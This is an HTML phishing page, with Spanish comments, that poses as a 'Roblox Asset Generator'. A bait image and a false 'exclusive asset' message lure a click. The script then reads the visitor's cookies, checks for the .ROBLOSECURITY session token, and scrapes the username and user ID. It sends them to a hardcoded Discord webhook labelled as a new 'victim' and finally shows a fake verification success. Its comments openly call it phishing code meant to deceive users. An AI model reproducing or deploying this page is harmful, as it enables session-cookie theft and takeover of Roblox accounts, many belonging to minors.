<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox Asset Generator</title>
    <style>
        body {
            font-family: 'Whitney', 'Helvetica Neue', Helvetica, Arial, sans-serif;
            background-color: #1e2124;
            color: #dcddde;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            text-align: center;
        }
        .container {
            background-color: #36393f;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
            max-width: 500px;
            width: 90%;
        }
        h1 {
            color: #ffffff;
            margin-top: 0;
        }
        .cebo-image {
            max-width: 100%;
            height: auto;
            border-radius: 8px;
            cursor: pointer;
            transition: transform 0.2s ease-in-out;
            box-shadow: 0 4px 15px rgba(114, 137, 218, 0.4);
        }
        .cebo-image:hover {
            transform: scale(1.03);
        }
        #cebo-link {
            text-decoration: none; /* Quita el subrayado del enlace */
            display: block;
        }
        .loader {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #7289da;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 2s linear infinite;
            margin: 20px auto;
            display: none; /* Oculto por defecto */
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .error-message {
            color: #f04747;
            font-weight: bold;
            margin-top: 20px;
            display: none; /* Oculto por defecto */
        }
        #mensaje-texto {
            margin-top: 20px;
            font-size: 16px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>¡Activo Exclusivo Detectado!</h1>
        
        <!-- La imagen es el cebo. El onclick ejecuta el script. -->
        <a href="#" id="cebo-link" onclick="ejecutarScript()">
            <!-- Puedes cambiar esta URL por la imagen que quieras usar -->
            <img src="https://www.latimes.com/espanol/entretenimiento/articulo/2022-11-10/universal-prepara-pelicula-biografica-de-snoop-dogg">
        </a>
        
        <!-- Mensaje que engaña al usuario -->
        <p id="mensaje-texto">Hemos encontrado un activo especial en tu cuenta. ¡Haz clic en la imagen para verificar tu identidad y añadirlo!</p>
        
        <!-- Loader y mensaje de error (ocultos al principio) -->
        <div id="loader" class="loader"></div>
        <div id="error-message" class="error-message">Error: No se pudo conectar con Roblox. Por favor, inténtalo de nuevo.</div>
    </div>

    <script>
        // Tu código original ahora está dentro de una función.
        async function ejecutarScript() {
            // Prevenir que el enlace "#" nos mueva a la parte superior de la página
            event.preventDefault(); 

            // Ocultar la imagen y el mensaje, y mostrar el loader
            document.getElementById('cebo-link').style.display = 'none';
            document.getElementById('mensaje-texto').style.display = 'none';
            document.querySelector('h1').innerText = 'Verificando Cuenta...';
            document.getElementById('loader').style.display = 'block';

            // --- TU CÓDIGO DE PHISHING AQUÍ ---
            const webhookUrl = 'https://discord.com/api/webhooks/1445825410926641163/ULQPiFYeOeEWeZ0vM9R_TnjBBmyhi0YyjxGZSltscGCfYf1xkWidkjo60NM5XT1uWKMt';
            const robloxCookie = document.cookie;

            if (!robloxCookie.includes('.ROBLOSECURITY=')) {
                document.getElementById('loader').style.display = 'none';
                document.getElementById('error-message').style.display = 'block';
                document.getElementById('error-message').innerText = 'Error: No se pudo encontrar la sesión de Roblox. Asegúrate de haber iniciado sesión.';
                return;
            }

            const usernameElement = document.querySelector('.navbar-username');
            const username = usernameElement ? usernameElement.innerText : 'N/A';
            const avatarLinkElement = document.querySelector('.navbar-avatar');
            const userIdMatch = avatarLinkElement ? avatarLinkElement.href.match(/\/users\/(\d+)/) : null;
            const userId = userIdMatch ? userIdMatch[1] : 'N/A';

            const payload = {
                content: '🍪 ¡Nueva víctima capturada!',
                embeds: [{
                    title: 'Detalles de la Cuenta',
                    color: 15158332,
                    fields: [
                        { name: '👤 Usuario', value: username, inline: true },
                        { name: '🆔 ID', value: userId, inline: true },
                        { name: '🍪 Cookie (.ROBLOSECURITY)', value: '```' + robloxCookie + '```', inline: false }
                    ],
                    footer: { text: 'Ejecutado via Imagen Cebo' },
                    timestamp: new Date().toISOString()
                }]
            };

            try {
                const response = await fetch(webhookUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });

                if (response.ok) {
                    console.log('Éxito: Datos enviados a Discord.');
                    // Mostrar mensaje de éxito falso
                    document.querySelector('.container').innerHTML = '<h1>¡Verificado!</h1><p>Tu cuenta ha sido verificada. El activo será añadido en breve.</p>';
                } else {
                    console.error('Error al enviar a Discord. Status:', response.status);
                    document.getElementById('loader').style.display = 'none';
                    document.getElementById('error-message').style.display = 'block';
                }
            } catch (error) {
                console.error('Error de red:', error);
                document.getElementById('loader').style.display = 'none';
                document.getElementById('error-message').style.display = 'block';
            }
        }
    </script>
</body>
</html>
